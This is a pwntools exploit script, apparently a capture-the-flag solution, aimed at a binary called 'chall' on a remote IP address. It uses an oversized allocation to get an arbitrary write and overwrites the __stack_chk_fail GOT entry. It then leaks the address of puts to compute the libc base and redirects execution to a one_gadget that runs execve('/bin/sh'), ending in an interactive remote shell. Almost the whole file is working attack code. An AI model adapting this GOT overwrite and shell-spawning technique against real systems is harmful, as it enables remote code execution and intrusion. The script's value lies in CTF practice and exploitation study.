from pwn import *

# p = process('./chall')
# p = remote('localhost', 5002)
p = remote('13.234.59.79', 8000)
elf = ELF('./chall')
libc = ELF('./libc.so.6')

s = '''
# b *0x000000000040087e
# b *0x4005d0
# b *0x00000000004007cd
# b *0x000000000040087c
b *0x400620
b *0x00000000004008ed
'''

# gdb.attach(p, s)

def alloc_and_idx(size, idx):
    p.sendlineafter('size:', str(size))
    p.sendlineafter('idx:', str(idx))

def write(where, what):
    p.sendafter('where:', where)
    p.send(what)
# 0x2351c

# alloc_and_idx(135168, 0x2351c)
alloc_and_idx(135168, 0x234dc)


# write(str(elf.got['__stack_chk_fail']), p64(0x0000000000400757))
write(str(elf.got['__stack_chk_fail']), p64(0x00000000004007d6))
# p.sendline('AAAAAAAA')

p.recvuntil('puts:')
leak = int(p.recvline().strip(), 16)
log.info('leak: ' + hex(leak))
libc_base = leak - libc.sym['puts']
log.info('libc base: ' + hex(libc_base))

# junk
# alloc_and_idx(10, 1)
# alloc_and_idx(135168, 0x4551c-2)
alloc_and_idx(135168, 0x454dc-2)

'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
log.info('one_gdaget: ' + hex(libc_base + 0x4f322))
write(str(elf.got['__stack_chk_fail']), p64(libc_base + 0x4f322))


p.interactive()
